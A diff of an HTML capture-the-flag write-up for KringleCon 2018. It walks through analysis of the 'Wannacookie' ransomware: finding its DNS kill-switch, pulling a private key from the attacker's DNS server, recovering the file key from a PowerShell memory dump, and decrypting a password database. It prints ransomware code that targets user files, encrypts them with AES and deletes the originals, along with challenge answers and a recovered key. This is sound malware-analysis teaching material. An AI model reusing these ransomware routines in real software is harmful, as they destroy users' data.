@@ -97,7 +97,9 @@
               Artefacts/Materials
             </a>
             <div class="dropdown-menu" aria-labelledby="navbarDropdownMenuLink">
-              <a class="dropdown-item" href="#artWannacookie">wannacookie.ps1</a>
+              <a class="dropdown-item" href="#artMenuPS1">menu.ps1 onboarding script from The Name Game</a>
+              <a class="dropdown-item" href="#artWannacookie">Wannacookie Source Code</a>
+              <a class="dropdown-item" href="#artWannacookieHTML">Wannacookie Source HTML Code</a>
             </div>
           </li>
         </ul>
@@ -126,6 +128,9 @@
         <h1><a id="narrative"></a>Narrative</h1>
         <div class="row center">
           <div class="col-2">
+            <img class="img-fluid" src="images/kc18_soldiers_pink_1.png">
+            <img class="img-fluid" src="images/kc18_soldiers_blue_2.png">
+            <img class="img-fluid" src="images/kc18_soldiers_red_2.png">
           </div>
           <div class="col-8">
             <p>As you walk through the gates, a familiar red-suited holiday figure warmly welcomes all of his special visitors to KringleCon.</p>
@@ -142,6 +147,9 @@
             <p>Congrats! You have solved the hardest challenge! Please visit Santa and Hans inside Santa's Secret Room for an update on your amazing accomplishment!</p>
           </div>
           <div class="col-2">
+            <img class="img-fluid" src="images/kc18_soldiers_orange_2.png">
+            <img class="img-fluid" src="images/kc18_soldiers_green_3.png">
+            <img class="img-fluid" src="images/kc18_soldiers_red_3.png">
           </div>
         </div>
       </div>
@@ -175,7 +183,7 @@
           <tr>
           <tr>
             <th scope="row"><a href="#obj4">4</a></th>
-            <td>Retrieve the encrypted ZIP file from the <a href="#artGitZip">North Pole Git repository</a>. What is the password to open this file?</td>
+            <td>Retrieve the encrypted ZIP file from the <a href="#obj94">North Pole Git repository</a>. What is the password to open this file?</td>
             <td class="text-nowrap" data-toggle="tooltip" title="John McClane's catch phrase from Die Hard">Yippee-ki-yay</td>
           <tr>
           <tr>
@@ -224,7 +232,7 @@
           <tr>
           <tr>
             <th scope="row"><a href="#obj94">9.4</a></th>
-            <td>After activating the kill-switch domain in the last question, Alabaster gives you <a href="#artZipFile">a zip file</a> with a memory dump and encrypted password database. Use these files to decrypt Alabaster's password database. What is the password entered in the database for the <b>Vault</b> entry?</td>
+            <td>After activating the kill-switch domain in the last question, Alabaster gives you <a href="#obj94">a zip file</a> with a memory dump and encrypted password database. Use these files to decrypt Alabaster's password database. What is the password entered in the database for the <b>Vault</b> entry?</td>
             <td class="text-nowrap" data-toggle="tooltip" title="From the Overture of The Marriage of Figaro and the piano unlock key for Willy Wonka's Chocolate Factory">ED#ED#EED#EF#G#F#G#ABA#BA#B</td>
           <tr>
           <tr>
@@ -253,8 +261,11 @@
           </tr>
           <tr>
             <td>WannaCookie Author "Bill Clay"</td>
-            <td>In the source html, <a href="#artWannaSource">source.html</a>, the author is cited as "Bill Clay". This is in reference to Hans Gruber in Die Hard. When John McClane happens upon Alan Rickman's character alone and unarmed, Alan uses a bad American accent to say his name is <a href="https://www.youtube.com/watch?v=c7SoiiZtRa0">"Clay... Bill Clay"</a>. Rumor is that this scene was quickly added after producers heard Alan's "American accent".</td>
+            <td>In the source html, <a href="#artWannacookieHTML">source.html</a>, the author is cited as "Bill Clay". This is in reference to Hans Gruber in Die Hard. When John McClane happens upon Alan Rickman's character alone and unarmed, Alan uses a bad American accent to say his name is <a href="https://www.youtube.com/watch?v=c7SoiiZtRa0">"Clay... Bill Clay"</a>. Rumor is that this scene was quickly added after producers heard Alan's "American accent".</td>
           </tr>
+          <tr>
+            <td>Tommy Tutone!</td>
+            <td>In the Wannacookie ransome html, it asks for 8675309 bitcoin. <a href="https://www.youtube.com/watch?v=6WTdTwcmxyo">867-5309 was Jenny's number.</a></td>
           <tr>
             <td>erohetfanu</td>
             <td>If you <code>echo erohetfanu | rev | tr 'A-Za-z' 'N-ZA-Mn-za-m'</code> the result is <code>hansgruber</code>. As a matter of fact, all domains in the provided pcaps in the snort challange are anagrams of hansgruber with different tlds of .net, .com, and .org.</td>
@@ -1158,6 +1169,12 @@ iex($(H2A $h | Out-string))</pre>
         <p>Analyze the full malware source code to find a kill-switch and activate it at the North Pole's domain registrar <a href="https://hohohodaddy.kringlecastle.com/index.html">HoHoHo Daddy</a>.</p>
         <p>What is the full sentence text that appears on the domain registration success message (bottom sentence)?</p>
         <hr class="my-4">
+        <p>Based on our analysis <a href="#artWannacookie">of the Wannacookie malware the artefacts section</a> we can see that there is a portion that will tell the malware to quit if certain conditions are met</p>
+        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">$S1 = "1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000";
+if ($null -ne ((Resolve-DnsName -Name $(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1))) $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings))).ToString() -ErrorAction 0 -Server 8.8.8.8))) { return };</pre>
+        <p>Here, if this specific DNS request is <b>NOT</b> null, then <b>return</b> which basically just means to quit the function. Breaking it down, <b>6B696C6C737769746368</b> converts to <b>killswitch</b>. <kbd>Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT</kbd> returns a hex string of <b>66667272727869657268667865666B73</b> which translates to <b>ffrrrxierhfxefks</b>.</p>
+        <p>Meanwhile, the value <b>$S1 = "1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000"</b>. That value is fed through a few different functions (hover over the function names). <kbd data-toggle="tooltip" title="Hex to Byte Array">H2B</kbd> -&gt; <kbd data-toggle="tooltip" title="GZIP compressed stream to Byte Array">G2B</kbd> -&gt; <kbd data-toggle="tooltip" title="Byte Array to Hex">B2H</kbd> resulting in the value <b>1f0f0202171d020c0b09075604070a0a</b>. These two values are pushed to <kbd data-toggle="tooltip" title="reversed it's xor_it, likely and XOR function">ti_rox</kbd> -&gt; <kbd data-toggle="tooltip" title="Byte Array to Hex">B2H</kbd> -&gt; <kbd data-toggle="tooltip" title="Hex to ASCII">H2A</kbd>. After feeding those functions into powershell and executing our code we get the domain that appears to be our killswitch, <b>yippeekiyaa.aaay</b>.</p>
+        <button class="btn btn-success">Successfully registered yippeekiyaa.aaay!</button>
       </div>
 
       <div class="border p-2 m-2">
@@ -1167,11 +1184,362 @@ iex($(H2A $h | Out-string))</pre>
           </button>
           <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
             <a class="dropdown-item" href="#npcAlabaster">Alabaster Snowball</a>
-            <a class="dropdown-item" href="#artZipFile">Memory Dump and WannaCookie encrypted database</a>
           </div>
         </div>
-        <p>After activating the kill-switch domain in the last question, Alabaster gives you <a href="#artZipFile">a zip file</a> with a memory dump and encrypted password database. Use these files to decrypt Alabaster's password database. What is the password entered in the database for the <b>Vault</b> entry?</p>
+        <p>After activating the kill-switch domain in the last question, Alabaster gives you <a href="https://www.holidayhackchallenge.com/2018/challenges/forensic_artifacts.zip">a zip file</a> with a memory dump and encrypted password database. Use these files to decrypt Alabaster's password database. What is the password entered in the database for the <b>Vault</b> entry?</p>
         <hr class="my-4">
+        <p>When we open the zip file we are presented with two files:</p>
+        <ul>
+          <li><b>alabaster_passwords.elfdb.wannacookie</b> - A wannacookie encrypted elfdb file.</li>
+          <li><b>powershell.exe_181109_104716.dmp</b> - A powershell dump file.</li>
+        </ul>
+        <p><a href="https://www.youtube.com/watch?v=wd12XRq2DNk">Chris Davis gives us some good pointers</a> on using <a href="https://github.com/chrisjd20/power_dump">PowerDump</a> to parse the <b>powershell.exe_181109_104716.dmp</b> file.</p>
+        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap"><span style="color: rgb(73, 113, 126);">==============================</span>
+<span style="color: rgb(73, 113, 126);"> |  __ \</span>
+<span style="color: rgb(73, 113, 126);"> | |__) |____      _____ _ __</span>
+<span style="color: rgb(73, 113, 126);"> |  ___/ _ \ \ /\ / / _ \ '__|</span>
+<span style="color: rgb(73, 113, 126);"> | |  | (_) \ V  V /  __/ |</span>
+<span style="color: rgb(73, 113, 126);"> |_|   \___/ \_/\_/ \___|_|</span>
+<span style="color: rgb(181, 137, 0);"> __</span>                       <span style="color: rgb(181, 137, 0);">__</span>
+<span style="color: rgb(181, 137, 0);"> \ \</span>         <span style="color: rgb(68, 182, 54);">(   )</span>       <span style="color: rgb(181, 137, 0);">/ /</span>
+<span style="color: rgb(181, 137, 0);">  \ \_</span>    <span style="color: rgb(68, 182, 54);">(   ) (</span>      <span style="color: rgb(181, 137, 0);">_/ /</span>
+<span style="color: rgb(181, 137, 0);">   \__\</span>    <span style="color: rgb(68, 182, 54);">)</span> <span style="color: rgb(211, 54, 130);">_</span>   <span style="color: rgb(68, 182, 54);">)</span>    <span style="color: rgb(181, 137, 0);">/__/</span>
+<span style="color: rgb(181, 137, 0);">      \\</span>    <span style="color: rgb(211, 54, 130);">( \_</span>     <span style="color: rgb(181, 137, 0);">//</span>
+<span style="color: rgb(181, 137, 0);">       `\</span> <span style="color: rgb(211, 54, 130);">_(_\ \)__</span> <span style="color: rgb(181, 137, 0);">/'</span>
+         <span style="color: rgb(211, 54, 130);">(____\___))</span>
+<span style="color: rgb(73, 113, 126);">  _____  _    _ __  __ _____</span>
+<span style="color: rgb(73, 113, 126);"> |  __ \| |  | |  \/  |  __ \</span>
+<span style="color: rgb(73, 113, 126);"> | |  | | |  | | \  / | |__) |</span>
+<span style="color: rgb(73, 113, 126);"> | |  | | |  | | |\/| |  ___/</span>
+<span style="color: rgb(73, 113, 126);"> | |__| | |__| | |  | | |</span>
+<span style="color: rgb(73, 113, 126);"> |_____/ \____/|_|  |_|_|</span>
+<span style="color: rgb(73, 113, 126);">Dumps PowerShell From Memory</span>
+<span style="color: rgb(73, 113, 126);">==============================</span>
+=======================================
+1. Load PowerShell Memory Dump File
+2. Process PowerShell Memory Dump
+3. Search/Dump Powershell Scripts
+4. Search/Dump Stored PS Variables
+e. Exit
+: 1
+
+============ Load Dump Menu ================
+COMMAND |     ARGUMENT       | Explanation
+========|====================|==============
+ld      | /path/to/file.name | load mem dump
+ls      | ../directory/path  | list files
+B       |                    | back to menu
+============= Loaded File: =================
+
+============================================
+: ld powershell.exe_181109_104716.dmp
+
+============ Load Dump Menu ================
+COMMAND |     ARGUMENT       | Explanation
+========|====================|==============
+ld      | /path/to/file.name | load mem dump
+ls      | ../directory/path  | list files
+B       |                    | back to menu
+============= Loaded File: =================
+<span style="color: rgb(68, 182, 54);">powershell.exe_181109_104716.dmp 427762187</span>
+============================================
+: b
+
+============ Main Menu ================
+<span style="color: rgb(68, 182, 54);">Memory Dump: powershell.exe_181109_104716.dmp</span>
+<span style="color: rgb(68, 182, 54);">Loaded     : True</span>
+<span style="color: rgb(220, 50, 47);">Processed  : False</span>
+=======================================
+1. Load PowerShell Memory Dump File
+2. Process PowerShell Memory Dump
+3. Search/Dump Powershell Scripts
+4. Search/Dump Stored PS Variables
+e. Exit
+: 2
+<span style="color: rgb(181, 137, 0);">[i] Please wait, processing memory dump...</span>
+<span style="color: rgb(68, 182, 54);">[+] Found 65 script blocks!</span>
+<span style="color: rgb(68, 182, 54);">[+] Found some Powershell variable names to work with...</span>
+<span style="color: rgb(68, 182, 54);">[+] Found 10947 possible variables stored in memory</span>
+Would you like to save this processed data for quick processing later "Y"es or "N"o?
+: Y
+
+<span style="color: rgb(68, 182, 54);">Successfully Processed Memory Dump!</span>
+
+Press Enter to Continue...
+
+============ Main Menu ================
+<span style="color: rgb(68, 182, 54);">Memory Dump: powershell.exe_181109_104716.dmp</span>
+<span style="color: rgb(68, 182, 54);">Loaded     : True</span>
+<span style="color: rgb(68, 182, 54);">Processed  : True</span>
+=======================================
+1. Load PowerShell Memory Dump File
+2. Process PowerShell Memory Dump
+3. Search/Dump Powershell Scripts
+4. Search/Dump Stored PS Variables
+e. Exit</pre>
+        <p>Before moving forward we should probably determine what we're looking for. Our goal is to decrypt the wannacookie file. Let's see what part of the script does this.</p>
+        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">[array]$f_c = $(Get-ChildItem *.elfdb -Exclude *.wannacookie -Path $($($env:userprofile + '\Desktop'),$($env:userprofile + '\Documents'),$($env:userprofile + '\Videos'),$($env:userprofile + '\Pictures'),$($env:userprofile + '\Music')) -Recurse | Where-Object { !$_.PSIsContainer } | ForEach-Object { $_.FullName });
+e_n_d $b_k $f_c $true;
+Clear-Variable -Name "h_k";
+Clear-Variable -Name "b_k";</pre>
+        <p>This part of the <kbd>wanc</kbd> function appears to look for elfdb files and then add them to an array variable <b>$f_c</b>. That array is then a parameter for the function <kbd>e_n_d</kbd></p>
+        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">function e_n_d { param($key,$allfiles,$make_cookie);
+  $tcount = 12;
+  for ($file = 0;
+    $file -lt $allfiles.Length;
+    $file++) { while ($true) { $running = @(Get-Job | Where-Object { $_.State -eq 'Running' });
+      if ($running.count -le $tcount) { Start-Job -ScriptBlock { param($key,$File,$true_false);
+          try { e_d_file $key $File $true_false } catch { $_.Exception.Message | Out-String | Out-File $($env:userprofile + '\Desktop\ps_log.txt') -Append } } -args $key,$allfiles[$file],$make_cookie -InitializationScript $functions;
+        break } else { Start-Sleep -m 200;
+        continue }
+      }
+    }
+  };</pre>
+        <p>It looks like it takes a variable, <kbd>$b_k</kbd>, as a key to encrypt the file. Let's back up a little and see where these variables come from.</p>
+        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">$p_k = [System.Convert]::FromBase64String($(g_o_dns ("7365727665722E637274")));
+$b_k = ([System.Text.Encoding]::Unicode.GetBytes($(([char[]]([char]01..[char]255) + ([char[]]([char]01..[char]255)) + 0..9 | sort { Get-Random })[0..15] -join '')) | Where-Object { $_ -ne 0x00 });
+$h_k = $(B2H $b_k);
+$k_h = $(sh1 $h_k);
+$p_k_e_k = (p_k_e $b_k $p_k).ToString();
+
+function p_k_e ($key_bytes,[byte[]]$pub_bytes) {
+  $cert = New-Object -TypeName System.Security.Cryptography.X509Certificates.X509Certificate2;
+  $cert.Import($pub_bytes);
+  $encKey = $cert.PublicKey.Key.Encrypt($key_bytes,$true);
+  return $(B2H $encKey)
+};
+</pre>
+        <ul>
+          <li><kbd>$p_k</kbd> - Public Key - This is filled from the return of a function called <kbd>g_o_dns</kbd>. The g_o_dns function looks exactly like the DNS TXT query function we found in the docm macro. It appears to be downloading a file called <code>server.crt</code>. <code>server.crt</code> are usually one pair of a public/private key pair for asymmetric encryption.</li>
+          <li><kbd>$b_k</kbd> - Byte Key - This appears to be a 16 byte array that is randomly generated. This key is cleared from memory later.</li>
+          <li><kbd>$h_k</kbd> - Hex Key - This is the hex version of the Byte key. This key is cleared from memory later.</li>
+          <li><kbd>$p_k_e_k</kbd> - Public Key Encrypted Key - This appears to take the public key and the byte key and runs them throught the function <kbd>p_k_e</kbd>. What's returned is the byte key encrypted with the public key. This key is NOT cleared later.</li>
+        </ul>
+        <p>What we need is the Byte Key, but that's unfortunately cleared from memory. What is NOT cleared is the Public Key Encrypted Key. We may be able to find that in memory and decrypt it if we can find the private key. First let's see if we can find the private key. Recalling the app.js source code and public key management in general, server.crt files are generally accompanied by the server.key file which is it's associated private key. Let's see if the <code>server.key</code> exists on the server. We can reuse the <kbd>g_o_dns</kbd> function to try to pull down the server.key using of the to malware's own functions.</p>
+        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">g_o_dns($(A2H("server.key")))
+-----BEGIN PRIVATE KEY-----
+MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDEiNzZVUbXCbMG
+L4sM2UtilR4seEZli2CMoDJ73qHql+tSpwtK9y4L6znLDLWSA6uvH+lmHhhep9ui
+W3vvHYCq+Ma5EljBrvwQy0e2Cr/qeNBrdMtQs9KkxMJAz0fRJYXvtWANFJF5A+Nq
+jI+jdMVtL8+PVOGWp1PA8DSW7i+9eLkqPbNDxCfFhAGGlHEU+cH0CTob0SB5Hk0S
+TPUKKJVc3fsD8/t60yJThCw4GKkRwG8vqcQCgAGVQeLNYJMEFv0+WHAt2WxjWTu3
+HnAfMPsiEnk/y12SwHOCtaNjFR8Gt512D7idFVW4p5sT0mrrMiYJ+7x6VeMIkrw4
+tk/1ZlYNAgMBAAECggEAHdIGcJOX5Bj8qPudxZ1S6uplYan+RHoZdDz6bAEj4Eyc
+0DW4aO+IdRaD9mM/SaB09GWLLIt0dyhRExl+fJGlbEvDG2HFRd4fMQ0nHGAVLqaW
+OTfHgb9HPuj78ImDBCEFaZHDuThdulb0sr4RLWQScLbIb58Ze5p4AtZvpFcPt1fN
+6YqS/y0i5VEFROWuldMbEJN1x+xeiJp8uIs5KoL9KH1njZcEgZVQpLXzrsjKr67U
+3nYMKDemGjHanYVkF1pzv/rardUnS8h6q6JGyzV91PpLE2I0LY+tGopKmuTUzVOm
+Vf7sl5LMwEss1g3x8gOh215Ops9Y9zhSfJhzBktYAQKBgQDl+w+KfSb3qZREVvs9
+uGmaIcj6Nzdzr+7EBOWZumjy5WWPrSe0S6Ld4lTcFdaXolUEHkE0E0j7H8M+dKG2
+Emz3zaJNiAIX89UcvelrXTV00k+kMYItvHWchdiH64EOjsWrc8co9WNgK1XlLQtG
+4iBpErVctbOcjJlzv1zXgUiyTQKBgQDaxRoQolzgjElDG/T3VsC81jO6jdatRpXB
+0URM8/4MB/vRAL8LB834ZKhnSNyzgh9N5G9/TAB9qJJ+4RYlUUOVIhK+8t863498
+/P4sKNlPQio4Ld3lfnT92xpZU1hYfyRPQ29rcim2c173KDMPcO6gXTezDCa1h64Q
+8iskC4iSwQKBgQCvwq3f40HyqNE9YVRlmRhryUI1qBli+qP5ftySHhqy94okwerE
+KcHw3VaJVM9J17Atk4m1aL+v3Fh01OH5qh9JSwitRDKFZ74JV0Ka4QNHoqtnCsc4
+eP1RgCE5z0w0efyrybH9pXwrNTNSEJi7tXmbk8azcdIw5GsqQKeNs6qBSQKBgH1v
+sC9DeS+DIGqrN/0tr9tWklhwBVxa8XktDRV2fP7XAQroe6HOesnmpSx7eZgvjtVx
+moCJympCYqT/WFxTSQXUgJ0d0uMF1lcbFH2relZYoK6PlgCFTn1TyLrY7/nmBKKy
+DsuzrLkhU50xXn2HCjvG1y4BVJyXTDYJNLU5K7jBAoGBAMMxIo7+9otN8hWxnqe4
+Ie0RAqOWkBvZPQ7mEDeRC5hRhfCjn9w6G+2+/7dGlKiOTC3Qn3wz8QoG4v5xAqXE
+JKBn972KvO0eQ5niYehG4yBaImHH+h6NVBlFd0GJ5VhzaBJyoOk+KnOnvVYbrGBq
+UdrzXvSwyFuuIqBlkHnWSIeC
+-----END PRIVATE KEY-----</pre>
+        <p>Great! Now we have a private key. We just need to get the <kbd>$p_k_e_k</kbd> value out of memory. Let's see what that would look like.</p>
+        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">PS C:\Users\PerroDeGuerra> $p_k = [System.Convert]::FromBase64String($(g_o_dns ("7365727665722E637274")));
+PS C:\Users\PerroDeGuerra> $b_k = ([System.Text.Encoding]::Unicode.GetBytes($(([char[]]([char]01..[char]255) + ([char[]]([char]01..[char]255)) + 0..9
+| sort { Get-Random })[0..15] -join '')) | Where-Object { $_ -ne 0x00 });
+PS C:\Users\PerroDeGuerra> function p_k_e ($key_bytes,[byte[]]$pub_bytes) { $cert = New-Object -TypeName System.Security.Cryptography.X509Certificates
+.X509Certificate2;
+>>   $cert.Import($pub_bytes);
+>>   $encKey = $cert.PublicKey.Key.Encrypt($key_bytes,$true);
+>>   return $(B2H $encKey) };
+PS C:\Users\PerroDeGuerra> (p_k_e $b_k $p_k).ToString()
+<span style="color: rgb(73, 113, 126);">3cf903522e1a3966805b50e7f7dd51dc7969c73cfb1663a75a56ebf4aa4a1849d1949005437dc44b8464dca05680d531b7a971672d87b24b7a6d672d1d811e6c
+34f42b2f8d7f2b43aab698b537d2df2f401c2a09fbe24c5833d2c5861139c4b4d3147abb55e671d0cac709d1cfe86860b6417bf019789950d0bf8d83218a56e6
+9309a2bb17dcede7abfffd065ee0491b379be44029ca4321e60407d44e6e381691dae5e551cb2354727ac257d977722188a946c75a295e714b668109d75c0010
+0b94861678ea16f8b79b756e45776d29268af1720bc49995217d814ffd1e4b6edce9ee57976f9ab398f9a8479cf911d7d47681a77152563906a2c29c6d12f971</span></pre>
+        <p>That final hex string is 512 characters long. Let's see if we can find something in memory that big.</p>
+        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">============ Main Menu ================
+Memory Dump: powershell.exe_181109_104716.dmp
+Loaded     : True
+Processed  : True
+=======================================
+1. Load PowerShell Memory Dump File
+2. Process PowerShell Memory Dump
+3. Search/Dump Powershell Scripts
+4. Search/Dump Stored PS Variables
+e. Exit
+: 4
+
+<span style="color: rgb(181, 137, 0);">[i] 10947 powershell Variable Values found!</span>
+============== Search/Dump PS Variable Values ===================================
+COMMAND        |     ARGUMENT                | Explanation
+===============|=============================|=================================
+print          | print [all|num]             | print specific or all Variables
+dump           | dump [all|num]              | dump specific or all Variables
+contains       | contains [ascii_string]     | Variable Values must contain string
+matches        | matches "[python_regex]"    | match python regex inside quotes
+len            | len [>|<|>=|<=|==] [bt_size]| Variables length >,<,=,>=,<= size
+clear          | clear [all|num]             | clear all or specific filter num
+===============================================================================
+: matches "^[0-9a-fA-F]+$"
+
+================ Filters ================
+<span style="color: rgb(68, 182, 54);">1| MATCHES  bool(re.search(r"^[0-9a-fA-F]+$",variable_values))</span>
+
+<span style="color: rgb(181, 137, 0);">[i] 196 powershell Variable Values found!</span>
+============== Search/Dump PS Variable Values ===================================
+COMMAND        |     ARGUMENT                | Explanation
+===============|=============================|=================================
+print          | print [all|num]             | print specific or all Variables
+dump           | dump [all|num]              | dump specific or all Variables
+contains       | contains [ascii_string]     | Variable Values must contain string
+matches        | matches "[python_regex]"    | match python regex inside quotes
+len            | len [>|<|>=|<=|==] [bt_size]| Variables length >,<,=,>=,<= size
+clear          | clear [all|num]             | clear all or specific filter num
+===============================================================================
+: len == 512
+
+================ Filters ================
+<span style="color: rgb(68, 182, 54);">1| MATCHES  bool(re.search(r"^[0-9a-fA-F]+$",variable_values))</span>
+<span style="color: rgb(68, 182, 54);">2| LENGTH  len(variable_values) == 512</span>
+
+<span style="color: rgb(181, 137, 0);">[i] 1 powershell Variable Values found!</span>
+============== Search/Dump PS Variable Values ===================================
+COMMAND        |     ARGUMENT                | Explanation
+===============|=============================|=================================
+print          | print [all|num]             | print specific or all Variables
+dump           | dump [all|num]              | dump specific or all Variables
+contains       | contains [ascii_string]     | Variable Values must contain string
+matches        | matches "[python_regex]"    | match python regex inside quotes
+len            | len [>|<|>=|<=|==] [bt_size]| Variables length >,<,=,>=,<= size
+clear          | clear [all|num]             | clear all or specific filter num
+===============================================================================
+: print
+<span class="pre-wrap" style="color: rgb(73, 113, 126);">3cf903522e1a3966805b50e7f7dd51dc7969c73cfb1663a75a56ebf4aa4a1849d1949005437dc44b8464dca05680d531b7a971672d87b24b7a6d672d1d811e6c
+34f42b2f8d7f2b43aab698b537d2df2f401c2a09fbe24c5833d2c5861139c4b4d3147abb55e671d0cac709d1cfe86860b6417bf019789950d0bf8d83218a56e6
+9309a2bb17dcede7abfffd065ee0491b379be44029ca4321e60407d44e6e381691dae5e551cb2354727ac257d977722188a946c75a295e714b668109d75c0010
+0b94861678ea16f8b79b756e45776d29268af1720bc49995217d814ffd1e4b6edce9ee57976f9ab398f9a8479cf911d7d47681a77152563906a2c29c6d12f971</span>
+Variable Values #1 above ^
+Type any key to go back and just Enter to Continue...</pre>
+        <p>Ok, so, no we have our <kbd>$p_k_e_k</kbd> and our private key. We just need to decrypt the encrypted blob. We can do this using a one-liner with openssl.</p>
+        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">echo 3cf903522e1a3966805b50e7f7dd51dc7969c73cfb1663a749d1949005437dc44b8464dca05680d531b7a971672d87b24b7a6d672d1d811e6c34f42b2f8d7f2b43aab698b537d2df2f401c2a09fbe24c5833d2c5861139c4b4d3147abb55e671d0cac709d1cfe86860b6417bf019789950d0bf8d83218a56e69309a2bb17dcede7abfffd065ee0491b379be44029ca4321e60407d44e6e381691dae5e551cb2354727ac257d977722188a946c75a295e714b668109d75c00100b94861678ea16f8b79b756e45776d29268af1720bc49995217d814ffd1e4b6edce9ee57976f9ab398f9a8479cf911d7d47681a77152563906a2c29c6d12f971 | xxd -r -p | openssl rsautl -oaep -decrypt -inkey ../server.key | xxd -p
+fbcfc121915d99cc20a3d3d5d84f8308</pre>
+        <p>And there is our hex encoded encryption key. Let's use the function in wannacookie to decrypt our elfdb file now. <a href="scripts/decrypt.ps1">We'll just write our own powershell script using the wannacookie functions to decrypt our file.</a></p>
+        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">$p_keys = "fbcfc121915d99cc20a3d3d5d84f8308"
+
+$functions = {
+  function e_d_file ($key,$File,$enc_it,$rep) { [byte[]]$key = $key;
+    $Suffix = "`.wannacookie";
+    [System.Reflection.Assembly]::LoadWithPartialName('System.Security.Cryptography');
+    [System.Int32]$KeySize = $key.Length * 8;
+    $AESP = New-Object 'System.Security.Cryptography.AesManaged';
+    $AESP.Mode = [System.Security.Cryptography.CipherMode]::CBC;
+    $AESP.BlockSize = 128;
+    $AESP.KeySize = $KeySize;
+    $AESP.Key = $key;
+    $FileSR = New-Object System.IO.FileStream ($File,[System.IO.FileMode]::Open);
+    if ($enc_it) { $DestFile = $File + $Suffix } else { $DestFile = ($File -replace $Suffix,$rep) };
+    $FileSW = New-Object System.IO.FileStream ($DestFile,[System.IO.FileMode]::Create);
+    if ($enc_it) { $AESP.GenerateIV();
+      $FileSW.Write([System.BitConverter]::GetBytes($AESP.IV.Length),0,4);
+      $FileSW.Write($AESP.IV,0,$AESP.IV.Length);
+      $Transform = $AESP.CreateEncryptor() } else { [Byte[]]$LenIV = New-Object Byte[] 4;
+      $FileSR.Seek(0,[System.IO.SeekOrigin]::Begin) | Out-Null;
+      $FileSR.Read($LenIV,0,3) | Out-Null;
+      [int]$LIV = [System.BitConverter]::ToInt32($LenIV,0);
+      [Byte[]]$IV = New-Object Byte[] $LIV;
+      $FileSR.Seek(4,[System.IO.SeekOrigin]::Begin) | Out-Null;
+      $FileSR.Read($IV,0,$LIV) | Out-Null;
+      $AESP.IV = $IV;
+      $Transform = $AESP.CreateDecryptor() };
+    $CryptoS = New-Object System.Security.Cryptography.CryptoStream ($FileSW,$Transform,[System.Security.Cryptography.CryptoStreamMode]::Write);
+    [int]$Count = 0;
+    [int]$BlockSzBts = $AESP.BlockSize / 8;
+    [Byte[]]$Data = New-Object Byte[] $BlockSzBts;
+    do {
+      $Count = $FileSR.Read($Data,0,$BlockSzBts);
+      $CryptoS.Write($Data,0,$Count)
+    } while ($Count -gt 0);
+    $CryptoS.FlushFinalBlock();
+    $CryptoS.Close();
+    $FileSR.Close();
+    $FileSW.Close();
+    Clear-Variable -Name "key";
+    Remove-Item $File
+  }
+};
+
+function B2H { param($DEC);
+  $tmp = '';
+  foreach ($value in $DEC) { $a = "{0:x}" -f [int]$value;
+    if ($a.Length -eq 1) { $tmp += '0' + $a } else { $tmp += $a }
+  };
+  return $tmp
+};
+
+function H2B { param($HX);
+  $HX = $HX -split '(..)' | Where-Object { $_ };
+  foreach ($value in $HX) { [Convert]::ToInt32($value,16) }
+};
+
+function e_n_d { param($key,$allfiles,$make_cookie);
+  $tcount = 12;
+  for ($file = 0;
+    $file -lt $allfiles.Length;
+    $file++) { while ($true) { $running = @(Get-Job | Where-Object { $_.State -eq 'Running' });
+      if ($running.count -le $tcount) { Start-Job -ScriptBlock {
+        param($key,$File,$true_false);
+          try {
+            e_d_file $key $File $true_false
+          } catch {
+            $_.Exception.Message | Out-String | Out-File $($env:userprofile + '\Desktop\ps_log.txt') -Append
+          }
+        } -args $key,$allfiles[$file],$make_cookie -InitializationScript $functions;
+        break
+      } else {
+        Start-Sleep -m 200;
+        continue
+      }
+    }
+  }
+};
+
+[array]$f_c = $(Get-ChildItem *.wannacookie | ForEach-Object { $_.Fullname } );
+foreach ($possible in $p_keys) {
+  $b_k = $(H2B $possible);
+  e_n_d $b_k $f_c $false $possible;
+}</pre>
+        <p></p>
+        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">PS C:\Users\PerroDeGuerra> .\decrypt.ps1
+
+Id     Name            PSJobTypeName   State         HasMoreData     Location             Command
+--     ----            -------------   -----         -----------     --------             -------
+1      Job1            BackgroundJob   Running       True            localhost            ...</pre>
+        <p>Looks like it may have worked. Let's take a closer look</p>
+        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap"><span style="color: rgb(0, 186, 19); font-weight: bold;">elf@776172646f67</span>$ file alabaster_passwords.elfdb
+alabaster_passwords.elfdb: SQLite 3.x database, last written using SQLite version 3015002
+<span style="color: rgb(0, 186, 19); font-weight: bold;">elf@776172646f67</span>$ sqlite3 alabaster_passwords.elfdb .dump
+PRAGMA foreign_keys=OFF;
+BEGIN TRANSACTION;
+CREATE TABLE IF NOT EXISTS "passwords" (
+        `name`  TEXT NOT NULL,
+        `password`      TEXT NOT NULL,
+        `usedfor`       TEXT NOT NULL
+);
+INSERT INTO passwords VALUES('alabaster.snowball','CookiesR0cK!2!#','active directory');
+INSERT INTO passwords VALUES('alabaster@kringlecastle.com','KeepYourEnemiesClose1425','www.toysrus.com');
+INSERT INTO passwords VALUES('alabaster@kringlecastle.com','CookiesRLyfe!*26','netflix.com');
+INSERT INTO passwords VALUES('alabaster.snowball','MoarCookiesPreeze1928','Barcode Scanner');
+INSERT INTO passwords VALUES('alabaster.snowball','ED#ED#EED#EF#G#F#G#ABA#BA#B','vault');
